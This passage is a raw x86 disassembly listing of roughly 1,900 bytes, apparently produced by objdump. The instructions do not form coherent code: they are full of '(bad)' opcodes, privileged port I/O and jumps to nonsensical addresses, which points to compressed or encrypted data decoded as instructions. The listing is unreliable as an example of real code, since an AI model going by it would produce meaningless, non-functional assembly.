  4126f2:	jno    0x41274e
  4126f4:	adc    al,0x50
  4126f6:	imul   ebx,DWORD PTR [ecx*2-0x380a1882],0xc
  4126fe:	mov    esp,0xbb8faa6e
  412703:	scas   al,BYTE PTR es:[edi]
  412704:	jp     0x4126eb
  412706:	xchg   BYTE PTR [edi],bh
  412708:	(bad)  
  412709:	das    
  41270a:	mov    cl,0xa7
  41270c:	pop    ss
  41270d:	xor    ebp,edx
  41270f:	sbb    BYTE PTR [edi-0x41],cl
  412712:	out    0xcf,eax
  412714:	arpl   di,dx
  412716:	out    dx,al
  412717:	adc    edx,DWORD PTR [edx+0x32]
  41271a:	lock xchg esi,eax
  41271c:	pop    ds
  41271d:	aas    
  41271e:	cmp    edi,DWORD PTR [ebp-0x7a]
  412721:	ret    
  412722:	dec    esp
  412723:	add    BYTE PTR [edx],al
  412725:	clc    
  412726:	lea    eax,[edx]
  412728:	xor    BYTE PTR [ebx+eax*2-0x1b5c0271],cl
  41272f:	jne    0x4126e1
  412731:	xchg   edi,eax
  412732:	jg     0x412714
  412734:	cmc    
  412735:	pop    ds
  412736:	cwde   
  412737:	dec    ecx
  412738:	jle    0x41279b
  41273a:	rol    DWORD PTR [edi],cl
  41273c:	or     al,0x1d
  41273e:	and    BYTE PTR [eax-0xea7bc21],al
  412744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412745:	mov    bl,0x32
  412747:	jns    0x412731
  412749:	repz adc BYTE PTR [eax-0x50],bh
  41274d:	mov    DWORD PTR [ecx+0x6],esp
  412750:	cwde   
  412751:	push   es
  412752:	push   ds
  412753:	pop    ds
  412754:	inc    ebp
  412755:	pop    ebp
  412756:	fadd   DWORD PTR [eax-0x7d]
  412759:	sbb    BYTE PTR [edx],bl
  41275b:	fiadd  WORD PTR [eax+eax*2]
  41275e:	jae    0x412737
  412760:	sub    edi,edi
  412762:	sbb    cl,BYTE PTR [edi+0x3d3f7c6b]
  412768:	xlat   BYTE PTR ds:[ebx]
  412769:	lock fwait
  41276b:	(bad)  
  41276c:	jae    0x41277b
  41276e:	pop    esp
  41276f:	adc    DWORD PTR [eax],ebp
  412771:	rol    esi,1
  412773:	shr    BYTE PTR [esi+0x30],cl
  412776:	cmc    
  412777:	call   0xe7358eb6
  41277c:	mov    ch,0xcd
  41277e:	addr16 adc eax,0xda683043
  412784:	mov    ch,0x4c
  412786:	(bad)  
  412787:	loope  0x4127f8
  412789:	cmc    
  41278a:	test   DWORD PTR [edi-0x11507a71],ebp
  412790:	aas    
  412791:	cmc    
  412792:	test   DWORD PTR [ebx-0x3f170829],0x7be071e9
  41279c:	push   edi
  41279d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41279e:	int    0x39
  4127a0:	sub    BYTE PTR [eax+0x15ddb1fb],cl
  4127a6:	jb     0x41272b
  4127a8:	sbb    al,0x51
  4127aa:	shl    ah,0xf0
  4127ad:	and    al,0x25
  4127af:	dec    esi
  4127b0:	dec    ebx
  4127b1:	push   es
  4127b2:	xchg   ebp,eax
  4127b3:	(bad)  
  4127b4:	jae    0x4127a6
  4127b6:	mov    ch,bh
  4127b8:	icebp  
  4127b9:	jae    0x41282c
  4127bb:	dec    eax
  4127bc:	push   es
  4127bd:	adc    BYTE PTR [ecx-0x2b],0x5f
  4127c1:	mov    esi,0xe43fb127
  4127c6:	pusha  
  4127c7:	and    BYTE PTR [ebx],al
  4127c9:	in     al,dx
  4127ca:	mov    bl,0x47
  4127cc:	cdq    
  4127cd:	fnstsw WORD PTR [eax+0x14b3d31]
  4127d3:	inc    esi
  4127d4:	push   es
  4127d5:	push   es
  4127d6:	mov    ch,0xec
  4127d8:	dec    ecx
  4127d9:	outs   dx,DWORD PTR ds:[esi]
  4127da:	dec    ebx
  4127db:	jae    0x4127de
  4127dd:	outs   dx,DWORD PTR ds:[esi]
  4127de:	jp     0x41285b
  4127e0:	jg     0x412855
  4127e2:	xlat   BYTE PTR ds:[ebx]
  4127e3:	repnz outs dx,DWORD PTR ds:[esi]
  4127e5:	mov    esi,0x43f8792a
  4127ea:	jbe    0x412859
  4127ec:	dec    esi
  4127ed:	fild   DWORD PTR [ecx+esi*4-0x681e12e7]
  4127f4:	cmp    al,0x27
  4127f6:	neg    BYTE PTR [ebx+esi*2+0x6b]
  4127fa:	cli    
  4127fb:	xor    esi,edx
  4127fd:	in     al,0xfd
  4127ff:	sti    
  412800:	fwait
  412801:	iret   
  412802:	cmp    BYTE PTR [edi],ah
  412804:	fs pusha 
  412806:	imul   edi,esp,0x46e7633d
  41280c:	scas   eax,DWORD PTR es:[edi]
  41280d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41280e:	xor    eax,DWORD PTR [edi+0x1d]
  412811:	sahf   
  412812:	pop    eax
  412813:	add    BYTE PTR [edx+0x10],al
  412816:	in     al,dx
  412817:	fmul   DWORD PTR [ebx+esi*2-0x26]
  41281b:	fwait
  41281c:	outs   dx,DWORD PTR ds:[esi]
  41281d:	cmp    al,0xea
  41281f:	mov    ebp,edi
  412821:	mov    al,0xed
  412823:	sbb    edi,DWORD PTR [ecx-0x19d61c00]
  412829:	push   DWORD PTR [esi+0x6b]
  41282c:	int3   
  41282d:	jp     0x412820
  41282f:	sub    esp,DWORD PTR [edx-0x7]
  412832:	cdq    
  412833:	jmp    FWORD PTR ds:0x838ed7fe
  412839:	add    edi,DWORD PTR [ecx]
  41283b:	jp     0x4127cb
  41283d:	out    0x4d,al
  41283f:	xchg   edi,eax
  412840:	jl     0x41287a
  412842:	cs jle 0x41280e
  412845:	sti    
  412846:	loop   0x412802
  412848:	outs   dx,BYTE PTR ds:[esi]
  412849:	daa    
  41284a:	mov    ds:0xd7f59ee7,eax
  41284f:	iret   
  412850:	dec    ebx
  412851:	retf   
  412852:	idiv   BYTE PTR [edx+0x400143d7]
  412858:	pop    ecx
  412859:	mov    ecx,0x7d8335e
  41285e:	loopne 0x4127fe
  412860:	cmp    ah,BYTE PTR [edx-0x6c]
  412863:	ss call 0x3c41f760
  412869:	loope  0x41284f
  41286b:	dec    edx
  41286c:	in     eax,0x45
  41286e:	ja     0x412817
  412870:	sub    DWORD PTR [eax],ecx
  412872:	rcr    BYTE PTR [ebx-0x78434ce4],1
  412878:	in     al,dx
  412879:	(bad)  
  41287a:	cld    
  41287b:	loope  0x4128d5
  41287d:	repnz lods al,BYTE PTR ds:[esi]
  41287f:	out    0xc7,eax
  412881:	ret    
  412882:	paddw  mm3,QWORD PTR [ebx-0x26]
  412886:	les    eax,FWORD PTR [ebx+0x24b0b627]
  41288c:	ret    
  41288d:	std    
  41288e:	clc    
  41288f:	fcom   DWORD PTR [eax]
  412891:	mov    dl,0xec
  412893:	iret   
  412894:	pop    ds
  412895:	sbb    al,0xec
  412897:	scas   al,BYTE PTR es:[edi]
  412898:	(bad)  [ebx-0x9]
  41289b:	mov    bh,0x12
  41289d:	in     eax,dx
  41289e:	(bad)  
  41289f:	xor    ebx,esp
  4128a1:	dec    ecx
  4128a2:	mov    cl,0xf6
  4128a4:	sub    eax,0xfdb6494a
  4128a9:	inc    edi
  4128aa:	or     al,0x1f
  4128ac:	mov    dh,0x50
  4128ae:	fimul  DWORD PTR [ebp+0xb82c8f2]
  4128b4:	push   es
  4128b5:	(bad)  
  4128b6:	or     edi,DWORD PTR [edi-0x3]
  4128b9:	stos   DWORD PTR es:[edi],eax
  4128ba:	mov    edi,0x7e6fb58e
  4128bf:	jae    0x4128f7
  4128c1:	dec    esi
  4128c2:	sub    al,0x65
  4128c4:	jne    0x412895
  4128c6:	jp     0x412909
  4128c8:	dec    edx
  4128c9:	out    dx,al
  4128ca:	dec    ebp
  4128cb:	std    
  4128cc:	retf   
  4128cd:	sbb    eax,DWORD PTR [edi]
  4128cf:	mov    al,ds:0x62187a82
  4128d4:	and    BYTE PTR [ebx-0x879bcb1],ah
  4128da:	add    ch,dh
  4128dc:	fwait
  4128dd:	mov    ecx,0xcbc0f37f
  4128e2:	jecxz  0x4128be
  4128e4:	pop    ebp
  4128e5:	fnsave [ebx+0x261fe6d2]
  4128eb:	cmc    
  4128ec:	push   ds
  4128ed:	fcompp 
  4128ef:	dec    edx
  4128f0:	mov    DWORD PTR [ecx],esp
  4128f2:	(bad)  
  4128f3:	mov    BYTE PTR [ecx+eax*1],al
  4128f6:	scas   al,BYTE PTR es:[edi]
  4128f7:	pop    esi
  4128f8:	rcr    bl,0xe3
  4128fb:	and    al,0x20
  4128fd:	sub    eax,0x912005c8
  412902:	add    al,0x10
  412904:	add    al,0x6b
  412906:	test   eax,0xb6313f57
  41290b:	outs   dx,BYTE PTR ds:[esi]
  41290c:	aas    
  41290d:	cmp    BYTE PTR [edx+0x518e9807],dl
  412913:	add    esp,DWORD PTR [edi+0x1c55e99c]
  412919:	int3   
  41291a:	(bad)  
  41291b:	lods   eax,DWORD PTR ds:[esi]
  41291c:	pop    ss
  41291d:	jecxz  0x412919
  41291f:	jae    0x412966
  412921:	or     DWORD PTR [ebx],ebp
  412923:	jmp    0x9f4f1037
  412928:	popa   
  412929:	repz aam 0xe1
  41292c:	pop    ds
  41292d:	pushf  
  41292e:	(bad)  
  412930:	push   es
  412931:	fidivr DWORD PTR [edi+0x24d73bef]
  412937:	retf   0xcf0f
  41293a:	(bad)  
  41293b:	mov    ch,0x7a
  41293d:	ins    BYTE PTR es:[edi],dx
  41293e:	jnp    0x412945
  412940:	lds    eax,FWORD PTR [edi]
  412942:	fld    QWORD PTR [edi]
  412944:	or     BYTE PTR [eax-0x2b],ah
  412947:	add    esi,esp
  412949:	push   ds
  41294a:	imul   edi,esi,0xfffffff0
  41294d:	(bad)  
  41294e:	cmp    al,0x8
  412950:	jecxz  0x4128f9
  412952:	pop    ss
  412953:	out    dx,al
  412954:	dec    edi
  412955:	fnstcw WORD PTR [edi+0x30]
  412958:	add    edi,esi
  41295a:	les    edi,FWORD PTR [esi+esi*4]
  41295d:	or     ebx,esp
  41295f:	pop    ecx
  412960:	jg     0x41297a
  412962:	aas    
  412963:	ss call 0xfe7dd609
  412969:	les    edi,FWORD PTR [eax+0x493f3bed]
  41296f:	scas   eax,DWORD PTR es:[edi]
  412970:	icebp  
  412971:	inc    esp
  412972:	and    DWORD PTR [esi-0xd04a526],ecx
  412978:	aaa    
  412979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41297a:	les    esi,FWORD PTR [ecx]
  41297c:	mov    esp,0x7f8f3dfd
  412981:	out    0xa0,eax
  412983:	inc    DWORD PTR [edi-0x9]
  412986:	inc    eax
  412987:	add    bh,cl
  412989:	(bad)  
  41298a:	int3   
  41298b:	pop    ebp
  41298c:	mov    al,0x21
  41298e:	add    DWORD PTR [ebx],0x27a3ffe2
  412994:	xchg   edi,eax
  412995:	(bad)  
  412996:	mov    esi,0xc533bc77
  41299b:	jmp    0x1e54c138
  4129a0:	(bad)  
  4129a1:	fcom   DWORD PTR [eax+ecx*2+0x30fb73e6]
  4129a8:	data16 adc al,0x84
  4129ab:	jne    0x4129dd
  4129ad:	jb     0x41295f
  4129af:	sbb    DWORD PTR [eax+0x277b7340],eax
  4129b5:	add    DWORD PTR [ecx],ebx
  4129b7:	push   esi
  4129b8:	jge    0x412950
  4129ba:	das    
  4129bb:	fst    DWORD PTR [esi]
  4129bd:	mov    ebx,DWORD PTR [edi-0x8472d06]
  4129c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129c4:	xchg   edi,eax
  4129c5:	(bad)  
  4129c7:	test   ebp,ecx
  4129c9:	mov    ebp,0x7ddc7b75
  4129ce:	lds    ecx,FWORD PTR [esi+ecx*8+0x67]
  4129d2:	in     eax,0xbb
  4129d4:	cs dec edx
  4129d6:	push   DWORD PTR [ecx+0x3bfb77c4]
  4129dc:	scas   al,BYTE PTR es:[edi]
  4129dd:	inc    BYTE PTR cs:[edx-0x6b]
  4129e1:	cmp    bl,BYTE PTR [ecx-0x9]
  4129e4:	loop   0x4129d4
  4129e6:	icebp  
  4129e7:	jne    0x412a47
  4129e9:	fdivr  st(6),st
  4129eb:	mov    BYTE PTR [ebp+0x4c3c5add],0x4f
  4129f2:	and    DWORD PTR [eax-0x17],eax
  4129f5:	inc    eax
  4129f6:	adc    BYTE PTR [ebp+0x252d1bc8],bh
  4129fc:	sbb    bh,BYTE PTR [edx-0x346a250a]
  412a02:	jmp    0x412a57
  412a04:	push   es
  412a05:	push   eax
  412a06:	fisubr DWORD PTR [ebx]
  412a08:	nop
  412a09:	(bad)  
  412a0a:	push   ss
  412a0b:	das    
  412a0c:	mov    WORD PTR [ebx+0x344177de],ss
  412a12:	cs pop eax
  412a14:	xchg   ebx,eax
  412a15:	dec    esi
  412a16:	xchg   ecx,eax
  412a17:	shl    DWORD PTR [esi-0x71acc3e7],0x27
  412a1e:	mov    ebp,0xbd603192
  412a23:	mov    dh,0xff
  412a25:	push   eax
  412a26:	rcl    BYTE PTR [edx+0x3b4e1ec3],1
  412a2c:	in     al,dx
  412a2d:	pusha  
  412a2e:	mov    BYTE PTR [edx+eiz*4+0x43],bl
  412a32:	lods   al,BYTE PTR ds:[esi]
  412a33:	pmulhw mm1,QWORD PTR [ecx+0x3b]
  412a37:	add    cl,BYTE PTR [edi]
  412a39:	in     al,dx
  412a3a:	dec    ecx
  412a3b:	dec    edx
  412a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a3d:	and    DWORD PTR [eax],eax
  412a3f:	mov    ch,BYTE PTR [esi-0x4d]
  412a42:	fnsave [ebx-0x15]
  412a45:	aam    0xc0
  412a47:	imul   esi,DWORD PTR [eax+0x6f3da7ff],0x22
  412a4e:	push   ds
  412a4f:	clc    
  412a50:	call   FWORD PTR [edi-0x65]
  412a53:	mov    esi,0x4b700807
  412a58:	xor    BYTE PTR [eax+ebx*4+0x39419b47],cl
  412a5f:	lock sbb bl,BYTE PTR [edi+0x324b70a3]
  412a66:	test   al,0x3d
  412a68:	cli    
  412a69:	or     ebp,0x43
  412a6c:	pop    eax
  412a6d:	inc    esi
  412a6f:	jle    0x412a71
  412a71:	sub    eax,0x890a1ef8
  412a76:	ret    0xdf3
  412a79:	mov    al,ds:0x389d478c
  412a7e:	mov    bl,0x49
  412a80:	add    eax,0xb3df5b47
  412a85:	in     eax,0x3d
  412a87:	jmp    0xfc45bf46
  412a8c:	mov    ebp,0x484026b7
  412a91:	dec    edi
  412a92:	pop    es
  412a93:	push   ds
  412a94:	cmp    DWORD PTR [ebx-0x3ad13b38],edx
  412a9a:	sbb    eax,0x557baa3d
  412a9f:	mov    WORD PTR [esi],ds
  412aa1:	adc    eax,DWORD PTR [esi-0x7c]
  412aa4:	push   edi
  412aa5:	jmp    0x5fcd:0x2fe34287
  412aac:	retf   
  412aad:	fdivp  st(3),st
  412aaf:	push   0xffffff81
  412ab1:	xchg   DWORD PTR [esi],ecx
  412ab3:	add    al,0x95
  412ab5:	mov    ch,0x96
  412ab7:	mov    edi,0x1dbfad89
  412abc:	aam    0x8d
  412abe:	les    ebx,FWORD PTR [edi]
  412ac0:	cmp    al,0x35
  412ac2:	cmp    eax,0xe6704f3b
  412ac7:	(bad)  
  412ac8:	mov    esp,0x7f0a35f0
  412acd:	hlt    
  412ace:	add    eax,0xd3b0801b
  412ad3:	(bad)  
  412ad4:	bswap  edx
  412ad6:	pusha  
  412ad7:	imul   edx,DWORD PTR [edi+eax*4],0x3ce756cb
  412ade:	and    DWORD PTR [ecx],ebx
  412ae0:	and    eax,0x31721559
  412ae5:	clc    
  412ae6:	adc    DWORD PTR [ebp-0x72f08c1a],ecx
  412aec:	pop    edi
  412aed:	pop    edi
  412aee:	js     0x412b67
  412af0:	pushf  
  412af1:	clc    
  412af2:	faddp  st(7),st
  412af4:	(bad)
  412af8:	xchg   ebp,eax
  412af9:	into   
  412afa:	push   esp
  412afb:	push   eax
  412afc:	push   es
  412afd:	jo     0x412af7
  412aff:	fiadd  DWORD PTR [ebp+0x173bf4b1]
  412b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b06:	sub    eax,0x647e78e4
  412b0b:	out    dx,al
  412b0c:	mov    edi,0x7df714df
  412b11:	in     al,dx
  412b12:	repz imul ebx,DWORD PTR [ecx-0x3c9f70ee],0x45bf73fb
  412b1d:	cli    
  412b1e:	fild   WORD PTR [ebx]
  412b20:	add    BYTE PTR [ebx+eiz*2+0x2ac1c558],al
  412b27:	or     al,0x96
  412b29:	pop    ss
  412b2a:	mov    cl,0x8e
  412b2c:	dec    edi
  412b2d:	jecxz  0x412b36
  412b2f:	cwde   
  412b30:	and    eax,0x7f53e97d
  412b35:	sbb    al,0xec
  412b37:	or     al,BYTE PTR [esi+0x0]
  412b3a:	jecxz  0x412b1b
  412b3c:	jg     0x412bb7
  412b3e:	popf   
  412b3f:	leave  
  412b40:	adc    eax,0xdca3f3cf
  412b45:	fdivp  st(7),st
  412b47:	lea    eax,[edx]
  412b49:	popf   
  412b4a:	lahf   
  412b4b:	xchg   edx,eax
  412b4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b4d:	ja     0x412baa
  412b4f:	loop   0x412bcc
  412b51:	int    0xcd
  412b53:	mov    WORD PTR [ebx-0x6e],ds
  412b56:	or     eax,0x76734fab
  412b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b5c:	cmp    eax,0x73633e
  412b61:	cmp    bh,cl
  412b63:	lea    esi,[ecx]
  412b65:	xchg   ebp,eax
  412b66:	jnp    0x412afe
  412b68:	mov    edi,0x11b47b96
  412b6d:	fbld   TBYTE PTR [eax+0x14]
  412b70:	jb     0x412b11
  412b72:	sub    esp,DWORD PTR [ecx-0x534b7f4d]
  412b78:	aam    0x7b
  412b7a:	mov    bl,0x6e
  412b7c:	(bad)  
  412b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b7e:	mov    ah,0x71
  412b80:	add    cl,BYTE PTR [edi]
  412b82:	adc    al,0xa1
  412b84:	dec    esp
  412b85:	jg     0x412b6e
  412b87:	mov    ch,0xb1
  412b89:	out    0xec,al
  412b8b:	mov    edi,0x7b2fdb8d
  412b90:	jg     0x412bcc
  412b92:	cs in  al,dx
  412b94:	in     al,0x37
  412b96:	(bad)  
  412b97:	xlat   BYTE PTR ds:[ebx]
  412b98:	fs adc al,0x4c
  412b9b:	add    al,0x82
  412b9d:	sub    ah,BYTE PTR [ebx-0x67]
  412ba0:	push   cs
  412ba1:	xor    DWORD PTR [edx],edi
  412ba3:	test   eax,0xff2daedc
  412ba8:	call   0xc396:0x41498100
  412baf:	push   ss
  412bb0:	mov    edi,0x843eed2e
  412bb5:	xlat   BYTE PTR ds:[ebx]
  412bb6:	inc    eax
  412bb7:	mov    ecx,0x46a7f8e6
  412bbc:	inc    ebx
  412bbd:	cmp    bh,BYTE PTR [edx-0x27]
  412bc0:	bnd jns 0x412bb4
  412bc3:	(bad)  
  412bc4:	sub    eax,0x171e4d5f
  412bc9:	add    eax,0xdb1001fb
  412bce:	inc    ebx
  412bcf:	pop    ecx
  412bd0:	jo     0x412bb0
  412bd2:	and    DWORD PTR [esi],esi
  412bd4:	(bad)  
  412bd5:	call   0xa7df463
  412bda:	ins    DWORD PTR es:[edi],dx
  412bdb:	shl    DWORD PTR [ebx],0x97
  412bde:	(bad)  
  412bdf:	mov    esp,0xb94daf95
  412be4:	or     DWORD PTR [edx-0x8],edx
  412be7:	lds    eax,FWORD PTR [edi+0x18f49af]
  412bed:	and    edi,ecx
  412bef:	enter  0x1e98,0xa
  412bf3:	pop    es
  412bf4:	(bad)  
  412bf5:	(bad)  
  412bf6:	cmc    
  412bf7:	(bad)  
  412bf8:	xchg   esp,eax
  412bf9:	or     eax,DWORD PTR [eax-0x17]
  412bfc:	pop    ds
  412bfd:	inc    eax
  412bfe:	shl    DWORD PTR [edx+edx*1],0xc0
  412c02:	push   es
  412c03:	xlat   BYTE PTR ds:[ebx]
  412c04:	popa   
  412c05:	inc    edi
  412c06:	and    BYTE PTR [eax],al
  412c08:	add    DWORD PTR [eax-0x37b5f23b],esp
  412c0e:	pop    edi
  412c0f:	pusha  
  412c10:	stos   DWORD PTR es:[edi],eax
  412c11:	call   0x3c80e3cb
  412c16:	lock cld 
  412c18:	hlt    
  412c19:	(bad)  
  412c1a:	out    dx,al
  412c1b:	dec    ebp
  412c1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c1d:	les    edi,FWORD PTR [eax+0x39]
  412c20:	outs   dx,DWORD PTR ds:[esi]
  412c21:	shl    DWORD PTR [edx],cl
  412c23:	imul   edx,DWORD PTR [edx-0x4],0xffffff8e
  412c27:	int3   
  412c28:	pop    es
  412c29:	adc    eax,0x1ccf92af
  412c2e:	mov    esp,0x890ff5d7
  412c33:	fprem1 
  412c35:	jmp    0x412bee
  412c37:	(bad)  
  412c38:	mov    eax,ds:0xba3dbfa7
  412c3d:	push   edi
  412c3e:	jl     0x412c7c
  412c40:	idiv   ah
  412c42:	cli    
  412c43:	mov    edx,0xf9e9fb44
  412c48:	add    DWORD PTR [esi+0x60787f5b],edi
  412c4e:	adc    bh,ch
  412c50:	arpl   cx,bx
  412c52:	wbinvd 
  412c54:	pop    esp
  412c55:	xor    BYTE PTR [eax],al
  412c57:	int    0x1
  412c59:	cmp    BYTE PTR [eax],al
  412c5b:	lock pusha 
  412c5d:	sbb    ah,ah
  412c5f:	inc    esp
  412c60:	pusha  
  412c61:	ins    BYTE PTR es:[edi],dx
  412c62:	or     DWORD PTR [esi+esi*1],esp
  412c65:	aas    
  412c66:	xchg   esp,eax
  412c67:	jbe    0x412cc5
  412c69:	loop   0x412c9c
  412c6b:	jno    0x412cd9
  412c6d:	mov    ds:0x49dc7c9a,al
  412c72:	imul   eax,DWORD PTR [ebp+0x1],0x6f3911bf
  412c79:	out    dx,al
  412c7a:	pop    ds
  412c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c7c:	imul   edx,DWORD PTR [eax-0x1ff19cb4],0xffffffb0
  412c83:	outs   dx,DWORD PTR ds:[esi]
  412c84:	cmp    eax,0x44c8ed37
  412c89:	ds or  ebx,esi
  412c8c:	mov    BYTE PTR [ebx+0x7d1f6635],al
  412c92:	push   edi
  412c93:	cmp    al,0xf2
  412c95:	mov    ebx,?
  412c97:	rol    DWORD PTR [ecx+0x732f9432],cl
  412c9d:	xor    DWORD PTR [eax-0x56],ebx
  412ca0:	les    edx,FWORD PTR [edx+0x7b1f0c22]
  412ca6:	or     al,0xc0
  412ca8:	add    al,dh
  412caa:	xchg   esp,eax
  412cab:	data16 xor bh,dl
  412cae:	push   ds
  412caf:	in     eax,0xc7
  412cb1:	imul   eax,DWORD PTR [esi+0x7df5801],0x5b
  412cb8:	add    ch,dl
  412cba:	inc    edi
  412cbb:	rcr    DWORD PTR [eax+0x5c0e0ec1],0x17
  412cc2:	mov    cl,0xf7
  412cc4:	lods   al,BYTE PTR ds:[esi]
  412cc5:	(bad)  
  412cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cc7:	std    
  412cc8:	sbb    ebp,DWORD PTR [ecx]
  412cca:	mov    dh,0xef
  412ccc:	addr16 cmc 
  412cce:	sbb    eax,0xbd397400
  412cd3:	fs enter 0x4cfc,0x97
  412cd8:	out    dx,eax
  412cd9:	fdiv   st(6),st
  412cdb:	xchg   esp,eax
  412cdc:	inc    ebp
  412cdd:	clc    
  412cde:	mov    cs,esi
  412ce0:	push   edx
  412ce1:	repnz das 
  412ce3:	lods   al,BYTE PTR ds:[esi]
  412ce4:	scas   al,BYTE PTR es:[edi]
  412ce5:	rcl    ebx,0x80
  412ce8:	ficomp DWORD PTR [eax-0x57]
  412ceb:	clc    
  412cec:	add    ch,BYTE PTR es:[ebp-0x6b41f230]
  412cf3:	cmp    ah,dl
  412cf5:	mov    WORD PTR [edi+ebp*4+0x35ec3729],?
  412cfc:	xchg   ebp,eax
  412cfd:	adc    bh,bh
  412cff:	jmp    0x57517d61
  412d04:	loop   0x412cef
  412d06:	sub    esi,ebp
  412d08:	fadd   DWORD PTR [edx-0x1e]
  412d0b:	in     eax,dx
  412d0c:	call   0xe2d4cca4
  412d11:	cmp    BYTE PTR [eax+0x4f],bh
  412d14:	sbb    BYTE PTR [edx],dl
  412d16:	mov    WORD PTR [esi-0x6f5e76b9],ds
  412d1c:	mov    dh,0x23
  412d1e:	jo     0x67ea295c
  412d24:	cld    
  412d25:	mul    esp
  412d27:	jno    0x412d10
  412d29:	out    dx,eax
  412d2a:	cmp    DWORD PTR [esi],esp
  412d2c:	sbb    DWORD PTR [edi],edi
  412d2e:	or     dh,BYTE PTR [esi]
  412d30:	(bad)  
  412d31:	loopne 0x412d1c
  412d33:	mov    cl,0x3b
  412d35:	lahf   
  412d36:	hlt    
  412d37:	scas   eax,DWORD PTR es:[edi]
  412d38:	xchg   ecx,eax
  412d39:	jle    0x412cbb
  412d3b:	scas   eax,DWORD PTR es:[edi]
  412d3c:	pop    edi
  412d3d:	rcr    BYTE PTR ds:[eax+edx*1+0x17],cl
  412d42:	cmc    
  412d43:	fcmovb st,st(2)
  412d45:	inc    ebx
  412d46:	sbb    eax,esi
  412d48:	push   ds
  412d49:	cmp    bl,ah
  412d4b:	lock rcl BYTE PTR [ebx+0x7ee945f],1
  412d52:	ins    DWORD PTR es:[edi],dx
  412d53:	test   cl,al
  412d55:	jmp    0x412dd6
  412d57:	sbb    al,0x40
  412d59:	add    BYTE PTR [edx-0x5a9c0f15],0xa9
  412d60:	out    dx,al
  412d61:	xor    ebx,DWORD PTR [esi+0x1e]
  412d64:	movq   mm6,mm7
  412d67:	rcr    BYTE PTR [eax-0xb],cl
  412d6a:	loope  0x412d43
  412d6c:	lds    ebp,FWORD PTR [ebp-0x12cc83a9]
  412d72:	inc    DWORD PTR [edi+0x5f]
  412d75:	mov    cl,0x7f
  412d77:	and    ecx,0xea1a7207
  412d7d:	mov    DWORD PTR [eax-0x20],ebx
  412d80:	stc    
  412d81:	sbb    DWORD PTR [edx-0x80],edx
  412d84:	sub    eax,0x58fa9d6c
  412d89:	push   0xffffff83
  412d8b:	(bad)  
  412d8d:	and    DWORD PTR [edi],esp
  412d8f:	add    cl,BYTE PTR [edi+0x495ec7cb]
  412d95:	out    dx,eax
  412d96:	sub    edi,edi
  412d98:	dec    ebp
  412d99:	xchg   ecx,eax
  412d9a:	daa    
  412d9b:	icebp  
  412d9c:	jl     0x412d7d
  412d9e:	xchg   BYTE PTR [ebx],ch
  412da0:	mov    ah,bh
  412da2:	push   0xb0d4d934
  412da7:	inc    DWORD PTR [ebx]
  412da9:	iret   
  412daa:	fistp  QWORD PTR [edi]
  412dac:	and    DWORD PTR [edx],ecx
  412dae:	mov    ebx,0x3fde7114
  412db3:	or     dh,BYTE PTR [esi-0x6]
  412db6:	rcr    DWORD PTR [eax],0xf0
  412db9:	jg     0x412db1
  412dbb:	sub    DWORD PTR [ecx],esi
  412dbd:	add    BYTE PTR [eax+0xb132204],al
  412dc3:	sar    dl,cl
  412dc5:	aas    
  412dc6:	xor    dh,bh
  412dc8:	test   eax,0xe0103d4f
  412dcd:	adc    ch,BYTE PTR [edi]
  412dcf:	inc    ecx
  412dd0:	add    BYTE PTR [ebp+0x1f],0xef
  412dd4:	out    0xea,al
  412dd6:	or     cl,bh
  412dd8:	dec    ebx
  412dd9:	inc    eax
  412dda:	js     0x412d63
  412ddc:	pop    ds
  412ddd:	into   
  412dde:	pop    eax
  412ddf:	sti    
  412de0:	(bad)  
  412de1:	out    0x24,eax
  412de3:	ret    
  412de4:	les    ecx,FWORD PTR [ecx+0xa31384a]
  412dea:	pusha  
  412deb:	mov    gs,WORD PTR [edi+edi*8]
  412dee:	xchg   ebp,eax
  412def:	cmp    eax,0xa486e000
  412df4:	test   ebx,ebp
  412df6:	sahf   
  412df7:	sbb    BYTE PTR [edi],cl
  412df9:	fnsave [ecx+0x5c]
  412dfc:	int3   
  412dfd:	fnstenv [esi+0x49]
  412e00:	fdiv   st(6),st
  412e02:	fwait
  412e03:	stos   DWORD PTR es:[edi],eax
  412e04:	(bad)  
  412e05:	leave  
  412e06:	xchg   ebx,eax
  412e07:	data16 jle 0x412e82
  412e0a:	add    eax,0xd72dc673
  412e0f:	add    al,0x19
  412e11:	(bad)  
  412e12:	cli    
  412e13:	sub    al,0x58
  412e15:	imul   edx,DWORD PTR [eax+0x6],0xfb2159d0
  412e1c:	dec    esp
  412e1d:	jp     0x412df6
  412e1f:	xor    edx,0x63
  412e22:	pushf  
  412e23:	pop    edx
  412e24:	out    dx,al
  412e25:	cmp    eax,0x39ac5175
  412e2a:	std    
  412e2b:	std    
  412e2c:	jmp    0x27804c66
  412e31:	cmp    ebp,DWORD PTR [ebx-0x3b8a59bb]
  412e37:	enter  0x4d4a,0x14
  412e3b:	pop    esi
  412e3c:	mov    ebx,0x687329cd
  412e41:	fisub  DWORD PTR [edi+0x1a]
  412e44:	out    0x8f,eax
  412e46:	fcmovnb st,st(4)
  412e48:	(bad)  
  412e49:	jmp    0x412eb4
  412e4b:	sbb    DWORD PTR [ecx],0x3
  412e4e:	jo     0x412e33
  412e50:	jne    0x412e16
  412e52:	sub    BYTE PTR [ebp-0x5a],bh
  412e55:	aam    0x45
  412e57:	mov    ebp,0xd7907686
  412e5c:	push   edi
  412e5d:	jbe    0x412e1c
  412e5f:	data16 xor bl,BYTE PTR [ecx+0x6f]
  412e63:	push   ebp
  412e64:	push   eax
  412e65:	xor    al,0x24
  412e67:	push   es
  412e68:	(bad)  
  412e69:	fnstcw WORD PTR [ecx+ecx*2-0x26]
  412e6d:	iret   
  412e6e:	(bad)  
  412e6f:	adc    edx,DWORD PTR [edx-0x50]
